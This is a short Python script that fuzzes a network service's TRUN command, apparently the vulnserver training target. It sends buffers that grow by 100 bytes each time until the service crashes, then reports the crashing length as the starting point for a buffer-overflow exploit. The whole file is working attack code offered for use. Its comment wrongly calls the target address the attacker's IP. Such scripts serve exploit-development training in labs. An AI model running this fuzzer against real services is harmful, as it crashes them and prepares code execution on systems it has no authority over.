#!/usr/bin/python3
import socket
import time

ip = "192.168.1.100"  # CHANGE THIS - put your attacker machine IP here
port = 9999
buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        banner = s.recv(1024)
        print(f"[*] Banner: {banner.decode()}")
        print(f"[*] Enviando {len(buffer)} bytes")
        s.send(("TRUN /.:/" + buffer).encode())
        s.close()
        time.sleep(1)
        buffer += "A" * 100
    except ConnectionRefusedError:
        print(f"[-] Crash detectado con {len(buffer)} bytes!")
        break
    except socket.timeout:
        print(f"[-] Timeout - posible crash con {len(buffer)} bytes!")
        break
    except Exception as e:
        print(f"[-] Error: {e} con {len(buffer)} bytes!")
        break
